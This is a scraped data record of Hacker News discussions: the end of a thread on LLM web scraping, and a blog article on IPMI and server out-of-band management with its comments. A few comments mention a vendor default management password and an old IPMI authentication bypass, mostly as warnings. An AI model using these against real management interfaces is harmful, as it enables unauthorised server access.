LetsGetTechnicl 5 hours agoprevSurely you don't need an LLM for this reply impure 16 hours agoprevI was thinking of adding a feature of my app to use LLMs to extract XPaths to generate RSS feeds from sites that don't support it. The section on XPaths is unfortunate. reply raybb 16 hours agoprevOn this note, does anyone know how Cursor scrapes websites? Is it just fetching locally and then feeding the raw html or doing some type of preprocessing? reply wslh 20 hours agoprevIsn't ollama an answer to this? Or is there something inherent to OpenAI that makes it significantly better for web scraping? reply simonw 19 hours agoparentGPT-4o (and the other top-tier models like Claude 3.5 Sonnet and Gemini 1.4 Pro) is massively more capable than models you can run on your own machine using Ollama - unless you can run something truly monstrous like Llama 3.1 405b, but that's requires 100GBs of GPU RAM which is very expensive. reply wslh 8 hours agorootparentI understand that if the web scraping activity has some ROI it is perfectly affordable. It is iust for fun it doesn't make sense but the article is already paying for a service and looking for a goal. reply FooBarWidget 8 hours agoprevCan anyone recommend an AI vision web browsing automation framework rather than just scraping? My use case: automate the monthly task of logging into a website and downloading the latest invoice PDF. reply kimoz 20 hours agoprevIs it possible to achieve good results using the open source models for scrapping? reply Gee101 15 hours agoprevA bit of topic but great post title. reply webprofusion 16 hours agoprevJust run the model locally? reply lccerina 11 hours agoprevWe are re-opening coal plants to do this? Every day a bit more disgusted by GenAI stuff reply fsndz 18 hours agoprevuseful for one shot cases, but not more for the moment imo. reply nsonha 15 hours agoprevMost discussion I found about the topic is how to extract information. Is there any technique for extracting interactive elements? I reckon listing all of inputs/controls would not be hard, but finding the corresponding labels/articles might be tricky. Another thing I wonder is, regarding text extraction, would it be a crazy idea to just snapshot the page and ask it to OCR & generate a bare minimum html table layout. That way both the content and the spatial relationship of elements are maintained (not sure how useful but I'd like to keep it anyway). reply blackeyeblitzar 15 hours agoprevI just want something that can take all my bookmarks, log into all by subscriptions using my credentials, and archive all those articles. I can then feed them to an LLM of my choice to ask questions later. But having the raw archive is the important part. I don’t know if there are any easy to use tools to do this though, especially with paywalled subscription based websites. reply albert_e 7 hours agoprevOfftopic: What are some good frameworks for webscraping and PDF document processing -- some public and some behind login, some requiring multiple clicks before the sites display relevant data. We need to ingest a wide variety of data sources for one solution. Very few of those sources supply data as API / json. reply kordlessagain 4 hours agoparentI have built most of this and have it running on Google Cloud as a service. The framework I built is Open Source. Let me know if you want to discuss: https://mitta.ai reply riiii 7 hours agoparentprevI like Crawlee: https://crawlee.dev/ reply LetsGetTechnicl 4 hours agoprev [–] I'm starting to think that LLM's are a solution in need of a problem like how crypto and the blockchain was. Have we not already solved web scraping? reply gallerdude 4 hours agoparent [–] New technologies can solve problems better. \"I'm starting to think computers are a solution in the need of a problem. Have we not already solved doing math?\" reply LetsGetTechnicl 1 hour agorootparent [–] Does it do it better? It also uses a ton more electricity so even if it's better, is it worth the cost? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The author explored using GPT-4o's new structured outputs feature to develop an AI-assisted web scraper, with promising initial results using Pydantic models.",
      "Challenges included parsing complex tables and managing costs, with a two-day experiment costing $24, leading to efforts to clean up HTML strings to improve performance.",
      "A demo was created using Streamlit, and the source code was shared on GitHub, with future plans to capture browser events and improve user experience."
    ],
    "commentSummary": [
      "Web scraping with GPT-4o is effective but costly, prompting users to convert HTML to simpler formats like markdown to reduce expenses.",
      "Tools such as Extractus, dom-to-semantic-markdown, Apify, and Firecrawl assist in this conversion, and user-assisted flows for generating XPaths are being explored.",
      "Alternatives like browserbase.com provide solutions for running Chrome extensions on headless browsers, and using smaller, fine-tuned models or generating scraping code can enhance efficiency and lower costs."
    ],
    "points": 328,
    "commentCount": 155,
    "retryCount": 0,
    "time": 1725306653
  },
  {
    "id": 41431244,
    "title": "IPMI",
    "originLink": "https://computer.rip/2024-08-31-ipmi.html",
    "originBody": ">>> 2024-08-31 ipmi (PDF) I am making steady progress towards moving the Computers Are Bad enterprise cloud to its new home, here in New Mexico. One of the steps in this process is, of course, purchasing a new server... the current Big Iron is getting rather old (probably about a decade!) and here in town I'll have the rack space for more machines anyway. In our modern, cloud-centric industry, it is rare that I find myself comparing the specifications of a Dell PowerEdge against an HP ProLiant. Because the non-hyperscale server market has increasingly consolidated around Intel specifications and reference designs, it is even rarer that there is much of a difference between the major options. This brings back to mind one of those ancient questions that comes up among computer novices and becomes a writing prompt for technology bloggers. What is a server? Is it just, like, a big computer? Or is it actually special? There's a lot of industrial history wrapped up in that question, and the answer is often very context-specific. But there are some generalizations we can make about the history of the server: client-server computing originated mostly as an evolution of time-sharing computing using multiple terminals connected to a single computer. There was no expectation that terminals had a similar architecture to computers (and indeed they were usually vastly simpler machines), and that attitude carried over to client-server systems. The PC revolution instilled a WinTel monoculture in much of client-side computing by the mid90s, but it remained common into the '00s for servers to run entirely different operating systems and architectures. The SPARC and Solaris combination was very common for servers, as were IBM's minicomputer architectures and their numerous operating systems. Indeed, one of the key commercial contributions of Java was the way it allowed enterprise applications to be written for a Solaris/SPARC backend while enabling code reuse for clients that ran on either stalwarts like Unix/RISC or \"modern\" business computing environments like Windows/x86. This model was sometimes referred to as client-server computing with \"thick clients.\" It preserved the differentiation between \"server\" and \"client\" as classes of machines, and the universal adherance of serious business software to this model lead to an association between server platforms and \"enterprise computing.\" Over time, things have changed, as they always do. Architectures that had been relegated to servers became increasingly niche and struggled to compete with the PC architecture on cost and performance. The general architecture of server software shifted away from vertical scaling and high-uptime systems to horizontal scaling with relaxed reliability requirements, taking away much of the advantage of enterprise-class computers. For the most part, today, a server is just a big computer. There are some distinguishing features: servers are far more likely to be SMP or NUMA, with multiple processor sockets. While the days of SAS and hardware RAID are increasingly behind us, servers continue to have more complex storage controllers and topologies than clients. And servers, almost by definition, offer some sort of out of band management. Out-of-band management, sometimes also called lights-out management, identifies a capability that is almost unheard of in clients. A separate, smaller management computer allows for remote access to a server even when it is, say, powered off. The terms out-of-band and in-band in this context emerge from their customery uses in networking and telecom, meaning that out of band management is performed without the use of the standard (we might say \"data plane\") network connection to a machine. But in practice they have drifted in meaning, and it is probably better to think of out-of-band management as meaning that the operating system and general-purpose components are not required. This might be made clearer by comparison: a very standard example of in-band management would be SSH, a service provided by the software on a computer that allows you to interact with it. Out-of-band management, by contrast, is provided by a dedicated hardware and software stack and does not require the operating system or, traditionally, even the CPU to cooperate. You can imagine that this is a useful capability. Today, out-of-band management is probably best exemplified by the remote console that most servers offer. It's basically an embedded IP KVM, allowing you to interact with the machine as if you were at a locally connected monitor and keyboard. A lot of OOB management products also offer \"virtual media,\" where you can upload an ISO file to the management interface and then have it appear to the computer proper as if it were a physical device. This is extremely useful for installing operating systems. OOB management is an interesting little corner of computer history. It's not a new idea at all; in fact, similar capabilities can be found through pretty much the entire history of business computing. If anything, it's gotten simpler and more boring over time. A few evenings ago I was watching a clabretro video about an IBM p5 he's gotten working. As is the case in most of his videos about servers, he has to give a brief explanation of the multiple layers of lower-level management systems present in the p5 and their various textmode and web interfaces. If we constrain our discussion of \"servers\" to relatively modern machines, starting say in the late '80s or early '90s, there are some common features: Some sort of local operator interface (this term itself being a very old one), like an LCD matrix display or grid of LED indicators, providing low-level information on hardware health. A serial console with access to the early bootloader and a persistent low-level management system. A higher-level management system, with a variable position in the stack depending on architecture, for remote management of the machine workload. A lot of this stuff still hangs around today. Most servers can tell you on the front panel if a redundant component like a fan or power supply has failed, although the number of components that are redundant and can be replaced online has dwindled with time from \"everything up to and including CPUs\" on '90s prestige architectures to sometimes little more than fans. Serial management is still pretty common, mostly as a holdover of being a popular way to do OS installation and maintenance on headless machines [1]. But for the most part, OOB management has consolidated in the exact same way as processor architecture: onto Intel IPMI. IPMI is confusing to some people for a couple of reasons. First, IPMI is a specification, not an implementation. Most major vendors have their own implementation of IPMI, often with features above and beyond the core IPMI spec, and they call them weird acronyms like HP iLO and Dell DRAC. These vendor-specific implementations often predate IPMI, too, so it's never quite right to say they are \"just IPMI.\" They're independent systems with IPMI characteristics. On the other hand, more upstart manufacturers are more likely to just call it IPMI, in which case it may just be the standard offering from their firmware vendor. Further confusing matters is a fair amount of terminological overlap. The IPMI software runs on a processor conventionally called the baseboard management controller or BMC, and the terms IPMI and BMC are sometimes used interchangeably. Lights-out management or LOM is mostly an obsolete term but sticks around because HP(E) is a fan of it and continues to call their IPMI implementation Integrated Lights-Out. The BMC should not be confused with the System Management Controller or SMC, which is one of a few terms used for a component present in client computers to handle tasks like fan speed control. These have an interrelated history and, indeed, the BMC handles those functions in most servers. IPMI also specifies two interfaces: an out-of-band interface available over the network or a serial connection, and an in-band interface available to the operating system via a driver (and, in practice, I believe communication between the CPU and the baseboard management controller via the low-pin-count or LPC bus, which is a weird little holdover of ISA present in most modern computers). The result is that you can interact with the IPMI from a tool running in the operating system, like ipmitool on Linux. That makes it a little confusing what exactly is going on, if you don't understand that the IPMI is a completely independent system that has a local interface to the running operating system for convenience. What does the IPMI actually do? Well, like most things, it's mostly become a webapp. Web interfaces are just too convenient to turn down, so while a lot of IPMI products do have dedicated client software, they're porting all the features into an embedded web application. The quality of these web interfaces varies widely but is mostly not very good. That raises a question, of course, of how you get to the IPMI web interface. Most servers on the market have a dedicated ethernet interface for the IPMI, often labelled \"IPMI\" or \"management\" or something like that. Most people would agree that the best way to use IPMI is to put the management network interface onto a dedicated physical network, for reasons of both security and reliability (IPMI should remain accessible even in case of performance or reliability problems with your main network). A dedicated physical network costs time, space, and money, though, so there are compromises. For one, your \"management network\" is very likely to be a VLAN on your normal network equipment. That's sort of like what AT&T calls a common-carrier switching arrangement, meaning that it behaves like an independent, private network but shares all of the actual equipment with everything else, the isolation being implemented in software. That was a weird comparison to make and I probably just need to write a whole article on CCSAs like I've been meaning to. Even that approach requires extra cabling, though, so IPMI offers \"sideband\" networking. With sideband management, the BMC communicates directly with the same NIC that the operating system uses. The implementation is a little bit weird: the NIC will pretend to be two different interfaces, mixing IPMI traffic into the same packet stream as host traffic but using a different MAC address. This way, it appears to other network equipment as if there are two different network interfaces in use, as usual. I will leave judgment as to how good of an idea this is to you, but there are obvious security considerations around reducing the segregation between IPMI and application traffic. And yes, it should be said, a lot of IPMI implementations have proven to be security nightmares. They should never be accessible to any untrusted person. Details of network features vary between IPMI implementations, but there is a standard interface on UDP 623 that can be used for discovery and basic commands. There's often SSH and a web interface, and VNC is pretty common for remote console. There are some neat basic functions you can perform with the IPMI, either over the network or locally using an in-band IPMI client. A useful one, if you are forgetful and keep poor records like I do, is listing the hardware modules making up the machine at an FRU or vendor part number level. You can also interact with basic hardware functions like sensors, power state, fans, etc. IPMI offers a standard watchdog timer, which can be combined with software running on the operating system to ensure that the server will be reset if the application gets into an unhealthy state. You should set a long enough timeout to allow the system to boot and for you to connect and disable the watchdog timer, ask me how I know. One of the reasons I thought to write about IPMI is its strange relationship to the world of everyday client computers. IPMI is very common in enterprise servers but very rare elsewhere, much to the consternation of people like me that don't have the space or noise tolerance for a 1U pizzabox in their homes. If you are trying to stick to compact or low-power computers, you'll pretty much have to go without. But then, there's kind of a weird exception. What about Intel ME and AMD ST? These are essentially OOB management controllers that are present in virtually all Intel and AMD processors. This is kind of an odd story. Intel ME, the Management Engine, is an enabling component of Intel Active Management Technology (Intel AMT). AMT was pretty much an attempt at popularizing OOB management for client machines, and offers most of the same capabilities as IPMI. It has been considerably less successful. Most of that is probably due to pricing, Intel has limited almost all AMT features to use with their very costly enterprise management platforms. Perhaps there is some industry in which these sell well, but I am apparently not in it. There are open-source AMT clients, but the next problem you will run into is finding a machine where AMT is actually usable. The fact that Intel AMT has sideband management capability, and that therefore the Intel ME component on which AMT runs has sideband management capability, was the topic of quite some consternation in the security community. Here is a mitigating factor: sideband management is only possible if the processor, motherboard chipset, and NIC are all AMT-capable. Options for all three devices are limited to Intel products with the vPro badge. The unpopularity of Intel NICs in consumer devices alone means that sideband access is rarely possible. vPro is also limited to relatively high-end processors and chipsets. The bad news is that you will have a hard time using AMT in your homelab, although some people certainly do. The upside is that the widely-reported \"fact\" that Intel ME is accessible via sideband networking on consumer devices is typically untrue, and for reasons beyond Intel software licensing. That leaves an odd question around Intel ME itself, though, which is certainly OOB management-like but doesn't really have any OOB management features without AMT. So why do nearly all processors have it? Well, this is somewhat speculative, but the impression I get is that Intel ME exists mostly as a convenient way to host and manage trusted execution components that are used for things like Secure Boot and DRM. These features all run on the same processor as ME and share some common technology stack. The \"management\" portion of Intel ME is thus largely vestigial, and it's part of the secure computing infrastructure. This is not to make excuses for Intel ME, which is entirely unauditable by third parties and has harbored significant security vulnerabilities in the past. But, remember, we all use one processor architecture from one of two vendors, so Intel doesn't have a whole lot of motivation to do better. Lest you respond that ARM is the way, remember that modern ARM SOCs used in consumer devices have pretty much identical capabilities. It is what it is. [1] The definition of \"headless\" is sticky and we have to not get stuck on it too much. People tend to say \"headless\" to mean no monitor and keyboard attached, but keep in mind that slide-out rack consoles and IP KVMs have been common for a long time and so in non-hyperscale environments truly headless machines are rarer than you would think. Part of this is because using a serial console is a monumental pain in the ass, so your typical computer operator will do a lot to avoid dealing with it. Before LCD displays, this meant a CRT and keyboard on an Anthro cart with wheels, but now that we are an enlightened society, you can cram a whole monitor and keyboard into 1U and get a KVM switching fabric that can cover the whole rack. Or swap cables. Mostly swap cables.",
    "commentLink": "https://news.ycombinator.com/item?id=41431244",
    "commentBody": "IPMI (computer.rip)233 points by pabs3 14 hours agohidepastfavorite100 comments sofixa 12 hours agoA few notes because there are a few pieces of information which aren't a 100% up to date: As most people know, Intel have lost the plot and are behind AMD on everything CPU and GPU related (with the tiny exception of the N100 series CPUs from Intel which are perfect for low power and even fanless applications). As such, their CPUs are mostly bought by organisations updating previous environments with like for like replacements for whatever reason (like vSphere's EVC which allows you to run newer processors from the same manufacturer as if they were an older model, and enable hot migration between CPU architectures and thus minimum disruption on hardware refreshes). Pretty much everyone else is getting the better and cheaper (per processing power) AMD CPUs. Intel NICs are pretty good overall (the X710 which spent a year+ with broken drivers causing silent network failures/downright crashes while still being in the hardware compatibility list of VMware and other \"enterprise\" vendors notwithstanding), and they're getting more popular for consumer devices too. An Intel CPU on a non-low cost PC/laptop almost always means an Intel NIC (WiFi and/or Ethernet). For many organisations buying servers, Supermicro* is probably their best option. They're cheaper, have much higher flexibility in terms of form factors, chassis, components, number of whatever slots and mostly reliable. However their support is less reliable than the theoretical Dell/HPE support, so it works best for redundant setups. Also, the IPMI specification is being replaced by Redfish which is much more complete, secure, normalised and presents normal usable APIs. Any mainline server from a few years ago should have Redfish alongside IPMI. * There's recent research from Hindenburg, a short selling research firm, that exposes some shady stuff from Supermicro - but their hardware is still top notch and used by the hyperscalers. https://hindenburgresearch.com/smci/ reply buserror 10 hours agoparentHaving had a play with both Supermicro and ASRock Rack boards for workstations (admittedly, only H12's so not the \"most recent\" but from my cursory glance and newer boards, nothing has changed that much), SuperMicro board feels like they were made in 2005, not 2024. It is ridiculous in fact. * No support for ACPI sleep. In 2024. Seriously. * No support for 4 and 3 pins fans. 3 pins are 100% speed all the time. * IPMI web interface straight out of 2010. * NVME placement prevents you from using heatsinks. * Tons of opaque jumpers on the board, with no board labelling. The ASRock Rack equivalent board is amazing in comparison. reply crest 2 hours agorootparentIf you think the latest SuperMicro IPMI webinterface is from 2010 you haven't seen their 2010 interfaces. Would you like to download the Java Web Start file to start your Remote Console? Use a Java Applet to see just the screenshot of the VGA output? How about getting RAID controllers with a (PS/2) mouse based GUI inside the OptionROM (looking at you LSI) only to find out the damn RAID controller manual lied about having a HBA passthrough mode. It just creates a single RAID volume per disk, but still stores controller specific metadata on the disks. If ASRock Rack got the SSH serial console redirection latency down from ~1 second to the low milliseconds like the other vendors (SuperMicro, Dell, HP, etc.) it would actually be useable without taking Valium before logging in.reply DannyBee 7 hours agorootparentprevAgreed. If nothing else, the IPMI web on supermicro randomly deciding you need to re-login constantly definitely feels very 2004. It's been this way for at least a decade, too. It's like it just forgets all its session variables sometimes. reply slavik81 5 hours agorootparentprevEvery vendor has their quirks. I have a pair of ASRock Rack ROMED8-2T/BCM boards, but my M.2 NVME boot drive is no longer detected if I update the BIOS past v3.50. Unfortunately, that means no support for resizable BAR in my configuration. I have a pair of Supermicro H12SSL-NT boards to use for my next couple builds. I might be trading one set of issues for another, but I'm optimistic they'll work well for my purposes. reply doublepg23 3 hours agorootparentprevI agree! I love my ASRock Rack board (X570si). I had written off ASRock as \"budget\" but it's been rock solid and had loads of features like you said. reply thelastparadise 7 hours agorootparentprevI don't want ACPI sleep on a server. reply kbolino 5 hours agorootparentWhy not? Assuming your servers are not all at or near full load at all times, you can put some to sleep as warm spares. reply fer 5 hours agorootparentAsking myself the same question, but IME Linux support for sleep states is (was?) generally horrible due to absolute lack of standard enforcement, and that's with laptops where it's a priority. I've only had one laptop (my most recent one) work 100% with sleep states, and only after replacing the NVMe that froze roughly 33% of the wake ups due to some obscure bug (but worked fine otherwise) reply mixmastamyk 2 hours agorootparentMaybe lucky, but haven’t had trouble with Linux and sleep for about 15 years. Dell and Framework. reply gosub100 1 hour agorootparentprevThey support wake on lan (most likely) and you could power up from IPMI REST API reply jpgvm 7 hours agoparentprevThe problem with Supermicro isn't the short report, the problem is the secure boot keys were leaked so a huge amount of their hardware is impossible to secure because the root of trust is broken. https://arstechnica.com/security/2024/07/secure-boot-is-comp... reply immibis 7 hours agorootparentDo you secure boot your systems? reply jpgvm 6 hours agorootparentI do but with my own PK. The problem is if the box has run untrusted code prior to that you can't trust it anymore. This is a bigger problem when you have a huge fleet of these already rather than my few servers in my home lab that I can manually enroll my own keys in. reply wang_li 3 hours agorootparent>The problem is if the box has run untrusted code prior to that you can't trust it anymore. If that's your threat model you shouldn't trust your computers anyway. You don't know what things have been inserted into the chips on the motherboard. You don't know what code is in your operating system and applications. You don't know what code the controllers on your storage devices are running. You don't know if there is a cellular chip on your motherboard or a chip that is waiting for a certain frequency radio wave to leak all your shit. You don't know that all the code on your system is RCE free or LPE free. You don't know that there aren't any insiders at your software vendors signing bad code to send to you. You haven't personally audited the binaries on your system or even their source code. reply PaulHoule 2 hours agoparentprevRecent Intel CPUs don't look too bad on paper but in practice they burn up. It's not too big of a surprise for me because lifespan will eventually become an increasing problem as feature size goes down (e.g. a mobile defect can make more trouble more easily.) They say it is a problem of the microcode asking for too much voltage from the motherboard and that's true, but it is also true that chips are going to be more sensitive to environmental upsets. Ever since the industry went past 10nm I figured there was a chance I'd buy something that was affected by I guess I dodged the bullet going with AMD. I remember loving Intel NICs for performance and Linux compatibility back in the day before you just used the NIC that came on the motherboard. For that matter I loved Intel SSDs but you had to read between the lines to see: (1) you got a little better performance in the P95-P99 range than cheaper competitors and (2) when you are getting frustrated that your computer is slow you are experiencing P95-P99. It's some of the reason why I both loved and hated Anandtech because they so often missed the plot. reply EvanAnderson 5 hours agoparentprev> ...the X710 which spent a year+ with broken drivers causing silent network failures/downright crashes... Did the X710 actually become stable? I got burned with them pretty early in their life have ended up staying away from them ever since. reply sofixa 2 hours agorootparentYep, as soon as the patched drivers were released (1.8 IIRC) it became rock solid and we never had any issues with it in the 3-4 years afterwards that I spent at the same place. reply DannyBee 8 hours agoparentprevAh yes, RedFish. I automate keeping IPMI ssl certain up to date using redfish apis. Importing the new certs requires slightly different magic (cert naming, encoding, etc) on every single different vendor implementation of redfish. I have a collection of Python modules to deal with each vendors eccentricity just around uploading and swapping ssl certs when it should be a set of standard put requests that work everywhere (that is what the redfish API docs would convince you of!) So not sure I would agree that it is either normalized or usable, as the whole point of something like redfish is that I shouldn’t have to do this. It is equally as annoying as it was when I had to drive their web interfaces directly. reply veber-alex 4 hours agorootparentYep. I had to write code to mount an iso image to a server, set the server to boot from it once and reboot the server to start the install. I had to do it for 4 vendors. Dell, Lenovo, Fujitsu and Supermicro. 4 different vendors, 4 different Redfish APIs. And what's annoying is that Redfish always looks similar so it fools you into thinking all the vendors do things the same way but no, suddenly some endpoint just doesn't exist in this vendors implementation and you have to scour the docs for this vendors unique magic uri. reply tucnak 12 hours agoparentprevI really wish Supermicro PSU's were accessible over PMBus without their proprietary IPMI utilities[1] but they're not. Moreover, it's x86-only so there's no way to interface it from ppc64el. Had it been open source, it could trivially be built. [1] https://www.supermicro.com/en/solutions/management-software/... reply neilv 4 hours agoprev> IPMI is very common in enterprise servers but very rare elsewhere, much to the consternation of people like me that don't have the space or noise tolerance for a 1U pizzabox in their homes. If you are trying to stick to compact or low-power computers, you'll pretty much have to go without. One option: you can get IPMI on an Atom-based Supermicro MicroATX board that can be cooled quietly with a small Noctua fan, in a short-depth 1U chassis. I have an older one at home. The quietness and small size made it much more attractive than the Dell R2x0 models I saw. And it has server features like IPMI and ECC RAM that made it more attractive than a mini-PC, and it was also more reliable than a flimsy RasPi. (I'd be happy with a Dell quiet short-depth 1U with comparable characteristics, but I'm not aware of one.) Personally, I wouldn't plug the IPMI port into my main LAN, but it's come in handy isolated from that, and was also a little fun to play with. reply doublepg23 3 hours agoparentThere's ASRock Rack boards with X470, X570, X670, etc. chipsets that take standard AM4/AM5 chips and have loads of server features like IPMI and ECC (I think that's already common on the AMD side). I managed to snag a 5950x to throw into mine but I was rocking a 5600G for a while. They're mATX/ATX too so they'll fit in a regular case and take a regular power supply - no racks needed! reply organsnyder 4 hours agoparentprevI keep my IPMI and other management interfaces segregated to a separate management VLAN that's only accessible via a dedicated VPN. reply temp0826 3 hours agorootparentThis is probably the minimum you should do. I remember a time when IPMI on (some?) Supermicro boards was really really insecure. From the IPMI client, you could set the encryption mode to \"0\" (\"null encryption\" or something, I dunno it's been years)- setting it allowed you to bypass the password completely. Assume if you can touch the IPMI, the system is yours. reply crest 3 hours agorootparentIPMI is still a festering cesspool no matter which vendor. Assume that layer 3 access to the IPMI grants you unrestricted persistent code execution on the managed system and design for with it in mind. Restrict access as tightly as possible. If you only need to power up/down/reset the system and access the serial console most IPMI implementations expose that via SSH. A small SSH proxy that exposes only those features would be a good investment. e.g. `ssh bastion [status|up|down|cycle|reset|console] `. You could probably write it inthe backend will be open-sourced soon (after the GitHub repository reaches 2K stars). https://en.wiki.sipeed.com/hardware/en/kvm/NanoKVM/system/in... reply justinclift 6 hours agorootparentHeh Heh Heh Wonder if they're serious about that? Do they know places are around (or at least used to be) which will inflate the # of stars for a repo for some minimal amount of cash? Like $20 per thousand(?) or so when I was reading an expose about that years ago... ;) reply TMWNN 11 hours agorootparentprevI guess the best choice would be something built on Raspberry Pi? Like PiKVM, or TinyPilot (both frequently discussed on HN)? reply jdboyd 10 hours agorootparentI've been interested in (but haven't yet tried) the BliKVM devices that are a for of PiKVM but are on a PCIeb card to put the device in the server. First generation from them used Pis the second switched to some other Linux SoC. reply johnklos 1 hour agoprevIPMI has its place, but it clearly shows how none of us can trust commercial entities to properly support hardware long term. The OS that runs on IPMI is usually relatively secure when the system is new, but as soon as there's a new CPU socket, the manufacturer starts caring less and less about keeping the older systems up to date, even if the same IPMI hardware is on both old and new boards. If we could load our own OS on to the IPMI hardware, it's be worlds more useful, because we could safely connect it straight to the Internet. As it is, we need sideband communications (VPN, port forward over ssh, separate network segment, whatever), which makes it so that we end up with lots of extra hardware and configurations just to support IPMI. For large installations, the extra cost is better aggregated, but for small installations, it's a rather large burden. Heck - for colocating a single machine, it's not even worth it. Since it's not possible to run IPMI directly on the Internet securely, I've ended up pairing machines with Pis of some sort. Doing this makes it just as easy - heck, easier - to use a serial port. That means we're back to the standard serial port control we've had since the days of VAXen and Sun and Alpha systems, which, the more I think about it, made much more sense than a network interface that's insecure. reply EvanAnderson 5 hours agoprevIn the late 90s I installed several Intel-produced servers (i.e. Intel reference platforms shipped as \"bare bones\" computers w/ RAM and storage to be provided by the integrator) that used the LANDesk Server Manager Pro[0] software and \"Emergency Management Card\" (EMC) for \"lights out\" management. (I'm talking about boxes like the AP450GX, BB440FX, RC440FX-- Pentium Pro to early Pentium II timeframe.) Given how reference code for the x86 platform never dies I've often wondered how much of the current IPMI edifice dates back to this hardware and software. As a point of note, the default password for the Intel LANDesk Emergency Management Card was \"calvin\". If you worked with earlier versions of the Dell iDRAC this will be a familiar password. I assume it's not coincidence. (As an aside: I was told by an Intel employee that the code name for the EMC was \"Hobbes\" but I can't find that documented anywhere.) You see versions of the EMC periodically on eBay.[1] There were both ISA and PCI versions. They're an x86 PC on a card. Some (all?) of them have an integral UPS. They had a PCMCIA slot to attach out-of-band management, an external power supply, and connected to the server motherboard through both the card's host bus interface and via proprietary connectors. I've downloaded firmware for some of the EMC versions and looked it over. It looks like some of the EMC versions an embedded DOS machine. (This has been one of my idle \"when I get to it\" projects and I haven't actually tried to reverse-engineer any of the code or get it running under qemu, though I'd like to.) Third-party companies who sold the Intel reference platforms (Unisys, Fujitsu, ALR/Gateway, NCR) offered these cards, too. It's a good giveaway that they're using an Intel reference platform when you see the card on-offer. References to \"LDSM\" are a giveaway. It'd be really wild if anybody on here knows anything about the heritage. [0] https://www.intel.com/pressroom/archive/releases/1998/ld1030... [1] https://web.archive.org/web/20240903131630/https://www.ebay.... reply ultra_nick 2 hours agoprevDell is working pretty hard to replace IPMI with Redfish these days. Redfish is an out of band management protocol like IPMI, but using an HTTP/JSON REST API that doesn't assume a secure management network. https://www.dmtf.org/standards/redfish reply jayofdoom 27 minutes agoparentDon't just give Dell the credit here :) OpenStack Ironic (ironicbaremetal.org) now ships a redfish driver that we have tested working on: - Dell machines - HPE machines (ilo 5 and 6) - SuperMicro - Most generic redfish endpoints as deployed by bulk \"off label\" server places A lot of folks in the provisioning automation space worked hard to try and enhance the state of the art (including some folks at Dell who were great :D) and get redfish accepted. It's a bit weird seeing this post; from our perspective, IPMI is a dangerous, attractive nuisance: it's nearly impossible to properly secure and has a lot more bad failure scenarios than a protocol built on http, that most of the time can support TLS with custom CAs and similar. reply dfox 6 hours agoprevAs for the Intel ME and AMD PSP: these things have a huge role in getting the CPU to state that looks like x86 PC so that the host firmware can actually run. The complexity of the initialization got so high, that doing that in SW on a separate embedded core that is “well-behaved” and can be programmed in C makes more sense than trying to write all that logic in weirdly limited assembly that is inherent in traditional early stage BIOS startup code. I believe that at least on some HPE ProLiants some part of this low-level initialization is in fact done by iLo, which at that boot stage also directly controls the framebuffer (on G10 you can even briefly see a flash of message like “handing over the console to host”, after which the display reinitializes and starts showing the function key legends). I assume that Dell does something similar, but in the early stages you simply get “Please wait” and giant throbber (and not any kind of progress indication). reply xaduha 12 hours agoprevIPMI and other solutions are nice, but what I would like to have is a standard serial interface to an UEFI shell running at all times. How I access that serial port should be my problem. reply mjg59 9 hours agoparentThe UEFI boot services that the shell relies upon aren't available after the bootloader or OS calls ExitBootServices() (the code is literally dropped out of ram and those regions handed back to the os) so this is not an easy thing to implement reply throw0101d 6 hours agoparentprev> IPMI and other solutions are nice, but what I would like to have is a standard serial interface to an UEFI shell running at all times. One thing I miss about Sun SPARC (and other Unix) systems: you had 'proper' remote access at a very low level. I always found BIOS/UEFI remote console very fiddly and hit and miss (you often have to play with GRUB/kernel settings to get input/output). reply bpye 11 hours agoparentprevServer hardware often will let you access UEFI via serial. You’d still need remote power control no? reply blipvert 10 hours agorootparentSilicon Graphics servers used to have a separate serial port that proved access to a (very) simple state machine that controlled power to the system. Send a ‘u’ it powered on. Send a ‘d’ it powered down. ‘s’ reported the state (IIRC). There was literally nothing that could go wrong. Then install the OS from the regular console port over the network with bootp/tftp/http. The complexity of DRAC/iLO setups to control an emulation of a VGA PC setup blows my mind. reply gnufx 9 hours agorootparent> an emulation of a VGA PC setup IPMI does rather more than than giving you console access, though it's serial, not VGA. Typical server BMCs which embed IPMI do more again. Not to defend the quality of various BMC firmware and support I've encountered... reply blipvert 6 hours agorootparentOh, yes, absolutely - fair point. It was more the remote power/boot/install process which seems unnecessarily complicated these days compared to serial. An elegant weapon for a more civilised age, or something ;-) reply qhwudbebd 8 hours agorootparentprevIf you're up for DIY, it's easy to turn a sufficiently long serial break into a toggle on a reset line and/or power button with a couple of discrete components. A serial break is the only situation in which an RS232 line is driven +ve with greater than 90% duty cycle: charge a cap slowly on +ve, discharge quickly on -ve (diode), drive a mosfet gate to pull reset line low only when it's been +ve for quarter of a second or so. Easily the hardest part of doing this is finding a 'clean' way to get a wire attached to the serial RX and GND pins from the inside the case rather than bodging something really ugly. Some boards have a front-facing serial port, though, which has a pin header and cable => easy to tap into. I'd soldered onto the little legs on a stand off board DB9 port on one batch of machines I installed, and then ended up being thwarted on the next batch of boards which had a slightly different (more enclosed) style of DB9 port that made it much harder to get at the pins. Whatever you do along these lines will be infinitely better than the insecure, overengineered catastrophe of vendor IPMI/BMC firmware. I wish someone less lazy than me would make a product along these lines... ;-) reply sandreas 12 hours agoprevI really like IPMI, but what I don't like about it for homelab use cases is the additional ~5W of idle power consumption. Using the Gigabyte MC12-LE0 Board with Ryzen Pro 5650 for a home server should be a no brainer costing ~50 bucks, but the higher power consumption is something I'm not totally happy with. On older devices (like Dell T20/T30) there is Intel AMT which is way less powerful and has security flaws, but at least SOME way to do remote administration when used with MeshCommander (unfortunately discontinued and releases deleted from everywhere - but I luckily saved the MSI and Node-Package on my server). I'm planning to try out PiKVM (V2) with a Raspberry 4 and a simple 8 bucks USB-HDMI-Capture-Card (https://docs.pikvm.org/v2/). Besides the lack of some features, it looks promising and more universal for devices that do not support remote management in any form. reply guenthert 10 hours agoparent> I really like IPMI, but what I don't like about it for homelab use cases is the additional ~5W of idle power consumption. How much more power is dissipated clearly depends on the quality of the PSU (constructing a power supply which is efficient at high loads and idle is quite a challenge). I doubt the BMC (sometimes built-in to the NIC) takes nearly that much. > I'm planning to try out PiKVM (V2) with a Raspberry 4 That'll exceed 5W though. reply geerlingguy 6 hours agorootparentMost of the boards I've tested with ASPEED chips consume between 5-7W when IPMI is running, and the system is powered off. They aren't all that efficient. reply progbits 8 hours agorootparentprevRPi 4 idles at around 3W and peaks at 5-6W so on average should be better. reply sandreas 8 hours 